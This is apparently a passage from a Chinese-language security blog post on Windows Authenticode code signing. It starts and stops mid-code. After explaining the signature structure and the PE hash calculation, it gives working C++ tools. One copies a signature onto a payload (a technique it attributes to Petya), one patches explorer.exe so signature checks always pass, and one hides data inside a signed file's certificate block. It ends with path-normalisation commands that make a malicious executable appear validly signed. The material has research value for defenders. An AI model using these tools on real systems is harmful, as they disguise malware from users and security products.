PowerShellSIPGUID = CRYPT_SUBJTYPE_POWERSHELL_IMAGE;</span><br><span class="line">    SupportedExtensions[<span class="number">0</span>] = <span class="string">L&quot;ps1&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">1</span>] = <span class="string">L&quot;ps1xml&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">2</span>] = <span class="string">L&quot;psc1&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">3</span>] = <span class="string">L&quot;psd1&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">4</span>] = <span class="string">L&quot;psm1&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">5</span>] = <span class="string">L&quot;cdxml&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">6</span>] = <span class="string">L&quot;mof&quot;</span>;</span><br><span class="line">    bResult = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (pwszFileName &amp;&amp; pgSubject) &#123;</span><br><span class="line">        Extension = <span class="built_in">wcsrchr</span>(pwszFileName, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Extension) &#123;</span><br><span class="line">            Extension++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">                <span class="keyword">if</span> (!_wcsicmp(Extension, SupportedExtensions[i])) &#123;</span><br><span class="line">                    bResult = TRUE;</span><br><span class="line">                    <span class="built_in">memcpy</span>(pgSubject, &amp;PowerShellSIPGUID, <span class="built_in">sizeof</span>(GUID));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">SetLastError</span>(ERROR_INVALID_PARAMETER);</span><br><span class="line">    <span class="keyword">return</span> bResult;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对于查看数位签名在PE档案中的位置，可用PE Bear。看到Data Directory表，有Security Directory栏位之位址是一个Offset位置，指向嵌入式Authenticode签名讯息，为WIN_CERTIFICATE结构。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WIN_CERTIFICATE</span> &#123;</span><br><span class="line">    DWORD dwLength;</span><br><span class="line">    WORD  wRevision;</span><br><span class="line">    WORD  wCertificateType;</span><br><span class="line">    BYTE  bCertificate[ANYSIZE_ARRAY];</span><br><span class="line">&#125; WIN_CERTIFICATE, * LPWIN_CERTIFICATE;</span><br></pre></td></tr></table></figure>

<p>dwLength记录以签名讯息资料起点处之后多少字节内部算是签名讯息资料。bCertificate栏位作为起点开始后所有资料都是校验用的证书记录内容。wCertificateType栏位记录bCertificate证书类型，选项如下。</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>WIN_CERT_TYPE_X509</td>
<td>X.509证书</td>
</tr>
<tr>
<td>WIN_CERT_TYPE_PKCS_SIGNED_DATA</td>
<td>PKCS#7方式填充的SignedData的结构</td>
</tr>
<tr>
<td>WIN_CERT_TYPE_RESERVED_1</td>
<td>保留</td>
</tr>
<tr>
<td>WIN_CERT_TYPE_TS_STACK_SIGNED</td>
<td>伺服器协议堆叠证书签名</td>
</tr>
</tbody></table>
<p>对于wRevision栏位值为WIN_CERT_REVISION_1_0代表旧版Win_Certificate，WIN_CERT_REVISION_2_0代表当代版本。证书签名资讯细节与档案指纹计算细节有<a target="_blank" rel="noopener" href="https://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx">https://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx</a> ，但这个有多少过时的内容我不好说。</p>
<p>签名讯息被拼接在政支PE静态档案内容结尾，即最后一个区段内容末尾，拼接起点为Secruity Directory所记录的Offset位址。在遵守PCKS#7方式填充的签名证书讯息，内文包含：</p>
<table>
<thead>
<tr>
<th>内容</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>contentInfo</td>
<td>记录签名当下该档案杂凑值作为指纹</td>
</tr>
<tr>
<td>certificates</td>
<td>记录签署人的X.509公开证书资讯</td>
</tr>
<tr>
<td>signerInfos</td>
<td>储存contentInfo杂凑值与用来显示给使用者检视签署人资讯，如签署人名称、参考网址、签署时间等</td>
</tr>
</tbody></table>
<p>档案指纹（即杂凑）的计算方法：</p>
<ol>
<li>将PE程式档案读入到记忆体中，并对杂凑演算法做必要的初始化。</li>
<li>将PE档案开头处到Checksum栏位（位于NT Headers之Optional Header结构）之前的资料进行杂凑计算并更新杂凑结果。</li>
<li>跳过Checksum栏位不做杂凑计算。</li>
<li>将Checksum栏位末端到Security Directory栏位之前的资料进行杂凑计算并更新杂凑结果。</li>
<li>跳过Security Directory栏位，即一个8字节IMAGE_DATA_DIRECTORY结构大小不做杂凑计算。</li>
<li>将Security Directory栏位末端开始到区段头阵列结尾的资料进行杂凑计算并更新杂凑结果。</li>
<li>宣告一个数值变数SUM_OF_BYTES_HASHED用以储存当前已对多少字节做过杂凑计算，接着将其预设值设为SizeOfHeaders数值。</li>
<li>建立一个区段头清单储存PE结构中的所有区段头资讯，并将清单中各个区段头按照其结构的PointrToRawData以小到大的升幂排序。</li>
<li>对已排序清单中每个区段头按顺序枚举、对区段头指向内容进行块状杂凑计算并更新杂凑结果，每杂凑完一个区段内容便将SUM_OF_BYTES_HASHED变数加上该区段内容大小。</li>
<li>此时Authenticode被储存在PE机构最末端，但若签名讯息后端还被多padding了其他资料，则将签名讯息块状结构后至档案EOF处所有多余资料再计算一次杂凑并更新杂凑结果。</li>
</ol>
<p>签名伪造，即将他人Authenticode签名讯息偷过来在恶意程式上。下面这个代码可简单将一个已签名的程式的数位签名直接拷贝到另一个程式上，此时签名是无效的，注意x86与x64要对应。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="function">PBYTE <span class="title">MapFileToMemory</span><span class="params">(LPCSTR filename, LONGLONG&amp; filelen)</span> </span>&#123;</span><br><span class="line">    FILE* fileptr;</span><br><span class="line">    PBYTE buffer;</span><br><span class="line">    fileptr = <span class="built_in">fopen</span>(filename, <span class="string">&quot;rb&quot;</span>); <span class="comment">// Open the file in binary mode</span></span><br><span class="line">    <span class="built_in">fseek</span>(fileptr, <span class="number">0</span>, SEEK_END);     <span class="comment">// Jump to the end of the file</span></span><br><span class="line">    filelen = <span class="built_in">ftell</span>(fileptr);         <span class="comment">// Get the current byte offset in the file</span></span><br><span class="line">    <span class="built_in">rewind</span>(fileptr);                 <span class="comment">// Jump back to the beginning of the file</span></span><br><span class="line">    buffer = (PBYTE)<span class="built_in">malloc</span>((filelen + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="type">char</span>)); <span class="comment">// Enough memory for file + \0</span></span><br><span class="line">    <span class="built_in">fread</span>(buffer, filelen, <span class="number">1</span>, fileptr);                       <span class="comment">// Read in the entire file</span></span><br><span class="line">    <span class="built_in">fclose</span>(fileptr);                                       <span class="comment">// Close the file</span></span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">PBYTE <span class="title">rippedCert</span><span class="params">(CONST PCHAR fromWhere, LONGLONG&amp; certSize)</span> </span>&#123;</span><br><span class="line">    LONGLONG signedPeDataLen = <span class="number">0</span>;</span><br><span class="line">    PBYTE signedPeData = <span class="built_in">MapFileToMemory</span>(fromWhere, signedPeDataLen);</span><br><span class="line">    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(&amp;signedPeData[<span class="built_in">PIMAGE_DOS_HEADER</span>(signedPeData)-&gt;e_lfanew]);</span><br><span class="line">    IMAGE_DATA_DIRECTORY certInfo = ntHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];</span><br><span class="line">    certSize = certInfo.Size;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, certSize);</span><br><span class="line">    PBYTE certData = <span class="keyword">new</span> BYTE[certInfo.Size];</span><br><span class="line">    <span class="built_in">memcpy</span>(certData, &amp;signedPeData[certInfo.VirtualAddress], certInfo.Size);</span><br><span class="line">    <span class="keyword">return</span> certData;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        PCHAR fileName = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;\\&#x27;</span>) ? <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span> : argv[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s [path/to/signed_pe] [path/to/payload] [path/to/output]\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// signature from where?</span></span><br><span class="line">    LONGLONG certSize;</span><br><span class="line">    PBYTE certData = <span class="built_in">rippedCert</span>(argv[<span class="number">1</span>], certSize);</span><br><span class="line">    <span class="comment">// payload data prepare.</span></span><br><span class="line">    LONGLONG payloadSize = <span class="number">0</span>;</span><br><span class="line">    PBYTE payloadPeData = <span class="built_in">MapFileToMemory</span>(argv[<span class="number">2</span>], payloadSize);</span><br><span class="line">    <span class="comment">// append signature to payload.</span></span><br><span class="line">    PBYTE finalPeData = <span class="keyword">new</span> BYTE[payloadSize + certSize];</span><br><span class="line">    <span class="built_in">memcpy</span>(finalPeData, payloadPeData, payloadSize);</span><br><span class="line">    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(&amp;finalPeData[<span class="built_in">PIMAGE_DOS_HEADER</span>(finalPeData)-&gt;e_lfanew]);</span><br><span class="line">    ntHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = payloadSize;</span><br><span class="line">    ntHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certSize;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;finalPeData[payloadSize], certData, certSize);</span><br><span class="line">    FILE* fp = <span class="built_in">fopen</span>(argv[<span class="number">3</span>], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="built_in">fwrite</span>(finalPeData, payloadSize + certSize, <span class="number">1</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;done.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>勒索软体佩提亚Petya在野攻击行动被卡巴斯基研究员@craiu于2017年观察到，其特色在于使用重大国家外泄军火（如EternalBlue、SMB漏洞与Office相关漏洞进行钓鱼）作为标配感染途径，并在全球肆虐攻击大型政府与民营机关如机场、地铁与银行。Petya为了让后门更难以被用户察觉而采用了以上签名窃取手段，使其后门伪装成微软发布的执行程式混淆视听。</p>
<h3 id="杂凑校验绕过"><a href="#杂凑校验绕过" class="headerlink" title="杂凑校验绕过"></a>杂凑校验绕过</h3><p>受数位签名的执行程式档案透过<code>CryptSIPGetSignedDataMsg</code>提取出签名讯息（即Security Directory指向的那块WIN_CERTIFICATE完整结构内容）之后，便能以<code>CryptSIPVerifyIndirectData</code>进行校验其签名讯息有效性。若其数位签名对当前程式档案内容仍有效将返回TRUE，反之FALSE。本小节目标为伪造<code>CryptSIPVerifyIndirectData</code>，任何呼叫该函数进行签名有效性确认时都回应TRUE。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="type">bool</span> patchedDone = <span class="literal">false</span>;</span><br><span class="line"><span class="type">char</span> tmpModName[MAX_PATH], * pfnCryptVerifyData;</span><br><span class="line"><span class="comment">/* 32bit mode</span></span><br><span class="line"><span class="comment"> *     +0x00 - 48       - dec eax</span></span><br><span class="line"><span class="comment"> *     +0x01 - 31 C0    - xor eax, eax</span></span><br><span class="line"><span class="comment"> *     +0x03 - FE C0    - inc  al</span></span><br><span class="line"><span class="comment"> *     +0x05 - C3       - ret</span></span><br><span class="line"><span class="comment"> * 64bit mode</span></span><br><span class="line"><span class="comment"> *     +0x00 - 48 31 C0 - xor rax, rax</span></span><br><span class="line"><span class="comment"> *     +0x03 - FE C0    - inc al</span></span><br><span class="line"><span class="comment"> *     +0x05 - C3       - ret</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> x96payload[] = &#123; <span class="string">&quot;\x48\x31\xC0\xFE\xC0\xC3&quot;</span> &#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    pfnCryptVerifyData = (PCHAR)<span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibraryA</span>(<span class="string">&quot;Crypt32&quot;</span>), <span class="string">&quot;CryptSIPVerifyIndirectData&quot;</span>);</span><br><span class="line">    <span class="built_in">EnumWindows</span>([](HWND hWnd, LPARAM lParam) -&gt; BOOL &#123;</span><br><span class="line">        DWORD processId = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">GetWindowThreadProcessId</span>(hWnd, &amp;processId);</span><br><span class="line">        <span class="keyword">if</span> (HANDLE hProc = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, processId)) &#123;</span><br><span class="line">            <span class="built_in">GetModuleFileNameExA</span>(hProc, <span class="literal">NULL</span>, tmpModName, <span class="built_in">sizeof</span>(tmpModName));</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">stricmp</span>(tmpModName, <span class="string">&quot;C:\\Windows\\explorer.exe&quot;</span>))</span><br><span class="line">                patchedDone |= <span class="built_in">WriteProcessMemory</span>(hProc, pfnCryptVerifyData, x96payload, <span class="built_in">sizeof</span>(x96payload), <span class="literal">NULL</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(patchedDone ? <span class="string">&quot;[+] Sign Verify Patch for Explorer.exe Done.&quot;</span> : <span class="string">&quot;[!] Explorer.exe Alive yet?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>本程序运行后将explorer.exe的<code>CryptSIPVerifyIndirectData</code>进行patch，直接返回TRUE，然后从explorer.exe文件属性中校验签名，发现签名正常。</p>
<h3 id="签名扩展攻击"><a href="#签名扩展攻击" class="headerlink" title="签名扩展攻击"></a>签名扩展攻击</h3><p>上个小节只是欺骗，本小节尝试从计算流程中找缺陷来绕过签名验证。</p>
<p>在杂凑计算流程中避开有：会因为植入签名讯息而异动的Checksum校验和、用于事后填写用的Secruity Directoy栏位、与签名讯息块本身结构。由于签名讯息本身不能被作为指纹杂凑计算流程的范畴、而受签名且其签署有效的程式档案又被Windows信任体系（如防毒厂商或系统自带白名单防护）视为安全无误的资料。于是选择在签名讯息块中藏匿任何恶意档案或资料，又不破坏签名有效性。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinTrust.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="function">PBYTE <span class="title">MapFileToMemory</span><span class="params">(LPCSTR filename, LONGLONG&amp; filelen)</span> </span>&#123;</span><br><span class="line">    FILE *fileptr;</span><br><span class="line">    PBYTE buffer;</span><br><span class="line">    fileptr = <span class="built_in">fopen</span>(filename, <span class="string">&quot;rb&quot;</span>); <span class="comment">// Open the file in binary mode</span></span><br><span class="line">    <span class="built_in">fseek</span>(fileptr, <span class="number">0</span>, SEEK_END);     <span class="comment">// Jump to the end of the file</span></span><br><span class="line">    filelen = <span class="built_in">ftell</span>(fileptr);         <span class="comment">// Get the current byte offset in the file</span></span><br><span class="line">    <span class="built_in">rewind</span>(fileptr);                 <span class="comment">// Jump back to the beginning of the file</span></span><br><span class="line">    buffer = (PBYTE)<span class="built_in">malloc</span>((filelen + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="type">char</span>)); <span class="comment">// Enough memory for file + \0</span></span><br><span class="line">    <span class="built_in">fread</span>(buffer, filelen, <span class="number">1</span>, fileptr);                       <span class="comment">// Read in the entire file</span></span><br><span class="line">    <span class="built_in">fclose</span>(fileptr);                                       <span class="comment">// Close the file</span></span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">        PCHAR fileName = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;\\&#x27;</span>) ? <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span> : argv[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s [path/to/signed_pe] [file/to/append] [path/to/output]\n&quot;</span>, fileName); <span class="comment">//具数位签名的程式档案 欲藏匿的资料档案 输出程式档案</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// read signed pe file &amp; payload</span></span><br><span class="line">    LONGLONG signedPeDataLen = <span class="number">0</span>, payloadSize = <span class="number">0</span>;</span><br><span class="line">    PBYTE signedPeData = <span class="built_in">MapFileToMemory</span>(argv[<span class="number">1</span>], signedPeDataLen), payloadData = <span class="built_in">MapFileToMemory</span>(argv[<span class="number">2</span>], payloadSize);</span><br><span class="line">    <span class="comment">// prepare space for output pe file.</span></span><br><span class="line">    PBYTE outputPeData = <span class="keyword">new</span> BYTE[signedPeDataLen + payloadSize];</span><br><span class="line">    <span class="built_in">memcpy</span>(outputPeData, signedPeData, signedPeDataLen);</span><br><span class="line">    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(&amp;outputPeData[((PIMAGE_DOS_HEADER)(outputPeData))-&gt;e_lfanew]);</span><br><span class="line">    PIMAGE_DATA_DIRECTORY certInfo = &amp;ntHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];</span><br><span class="line">    <span class="comment">// append payload into certificate</span></span><br><span class="line">    LPWIN_CERTIFICATE certData = (LPWIN_CERTIFICATE)(&amp;outputPeData[certInfo-&gt;VirtualAddress]);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;<span class="built_in">PCHAR</span>(certData)[certData-&gt;dwLength], payloadData, payloadSize);</span><br><span class="line">    certInfo-&gt;Size = (certData-&gt;dwLength += payloadSize);</span><br><span class="line">    <span class="comment">// flush pe data back to file</span></span><br><span class="line">    <span class="built_in">fwrite</span>(outputPeData, <span class="number">1</span>, signedPeDataLen + payloadSize, <span class="built_in">fopen</span>(argv[<span class="number">3</span>], <span class="string">&quot;wb&quot;</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;done.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="路径正规化滥用攻击"><a href="#路径正规化滥用攻击" class="headerlink" title="路径正规化滥用攻击"></a>路径正规化滥用攻击</h3><p>DOS路径2.0路径正规化流程为：确认传入路径为下列哪种类型；将路径中所有斜杠取代为反斜杠；若有多个反斜杠则收叠成一个；若有当前目录“.”则移除，有上层目录“..”则移除上层目录名；最后一个资源为路径分隔符反斜杠则代表一个目录，并保留；若末端不是路径分隔符、空白字元或点字元则移除。</p>
<p>任何透过Windows API取得的路径必定经过上述路径正规化步骤，若传入路径用前缀“\\?\”则上述步骤直接被跳过。第一点是因为NTFS和FAT等文件系统支持“foo.”等文件名，但标准Windows路径不合法，需要访问这类档案时使用；Windows XP~8的路径长度最长不超过MAX_PATH即260字元，但Windows 10中支持32767字元，用该前缀绕过传统的路径长度检测。</p>
<p>Windows API内部呼叫<code>ntdll!RtlDetermineDosPathNameType_U</code>将传入路径归类下列类型其中一种：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>含义</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>RtlPathTypeRooted</td>
<td>根目录作为当工作目录磁碟槽下的相对路径</td>
<td>\Windows</td>
</tr>
<tr>
<td>RtlPathTypeDriveRelative</td>
<td>磁碟槽相对路径</td>
<td>C:Windows</td>
</tr>
<tr>
<td>RtlPathTypeRootLocalDevice</td>
<td>本地根设备路径</td>
<td>\\?\C:\Windows\explorer.exe</td>
</tr>
<tr>
<td>RtlPathTypeLocalDevice</td>
<td>本地设备路径</td>
<td>\\.\C:\Windows\explorer.exe</td>
</tr>
<tr>
<td>RtlPathTypeUncAbsolute</td>
<td>UNC相对路径</td>
<td>\\127.0.0.0\C$\Windows\explorer.exe</td>
</tr>
<tr>
<td>RtlPathTypeDriveAbsolute</td>
<td>典型绝对路径</td>
<td>C:\Windows\explorer.exe</td>
</tr>
<tr>
<td>RtlPathTypeRelative</td>
<td>典型相对路径</td>
<td>bin\</td>
</tr>
</tbody></table>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\tmp</span><br><span class="line"><span class="built_in">mkdir</span> \dir_a <span class="comment">#新建的是C:\dir_a\</span></span><br><span class="line">mdkir dir_b\ <span class="comment">#新建的是C:\tmp\dir_b\</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> C:\tmp</span><br><span class="line"><span class="built_in">mkdir</span> \??\C:\tmp..</span><br><span class="line"><span class="built_in">mkdir</span> C:\tmp\kami</span><br><span class="line">mdkir \??\C:\tmp..\malicious</span><br><span class="line">explorer.exe C:\tmp..\ <span class="comment">#实际弹出C:\tmp\</span></span><br><span class="line"><span class="comment">#例如此时将具有数位签名的程式放在C:\tmp\下，把恶意程式放在C:\tmp..\下，两个名字都为GoogleUpdate.exe</span></span><br><span class="line">wmic process call create C:\tmp..\GoogleUpdate.exe <span class="comment">#实际运行恶意程式，但数位签名是正常的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;....&quot;</span> <span class="comment">#还是当前目录</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;\. .. ...&quot;</span> <span class="comment">#上层目录</span></span><br><span class="line"><span class="built_in">cd</span> C:\tmp</span><br><span class="line"><span class="built_in">cd</span> C:hello <span class="comment">#被判定为RtlPathTypeDriveRelative 解析到C:\tmp\hello目录</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\\127.0.0.1\C$\Windows\System32\cmd&quot;</span> /c <span class="built_in">whoami</span></span><br><span class="line"><span class="string">&quot;\\localhost\C$\Windows\System32\cmd&quot;</span> /c <span class="built_in">whoami</span></span><br><span class="line">wmic process call create <span class="string">&quot;\\?\UNC\127.0.0.1\C$\windows\system32\cmd.exe /c whoami &amp;&amp; pause&quot;</span></span><br><span class="line">wmic process call create <span class="string">&quot;\\?\UNC\::1\C$\windows\system32\cmd.exe /c whoami &amp;&amp; pause&quot;</span></span><br><span class="line">\\.\GLOBAL\UNC\::1\C$\Windows\System32\cmd /c <span class="built_in">whoami</span></span><br><span class="line">\\.\GLOBALROOT\Device\Mup\::1\c$\Windows\System32\cmd /c <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">echo</span> xxx&gt;\\.\GLOBALROOT\Device\NULL &amp; <span class="built_in">ls</span></span><br><span class="line">wmic process call create <span class="string">&quot;\\.\GLOBALROOT\GLOBAL??\UNC\::1\c$\Windows\System32\cmd /c echo xxx <span class="variable">$pause</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#WinObj中\GLOBAL??下能看到很多符号链接 如下</span></span><br><span class="line"><span class="built_in">echo</span> aaa&gt;\\.\NUL <span class="comment">#位桶</span></span><br><span class="line"><span class="string">&quot;\\.\$data&lt;&gt;\ \..\..\C:\Windows\System32\cmd&quot;</span> /c <span class="built_in">whoami</span></span><br><span class="line"><span class="string">&quot;\\.\C:\msgbox.exe\A\B\..\..\..\..\C:\Windows\System32\cmd&quot;</span> /c <span class="built_in">whoami</span></span><br><span class="line"><span class="string">&quot;\\.\Z:\X:\Y:\../../../\UNC\::1/////\\\\\C$\Windows\System32\cmd&quot;</span> /c <span 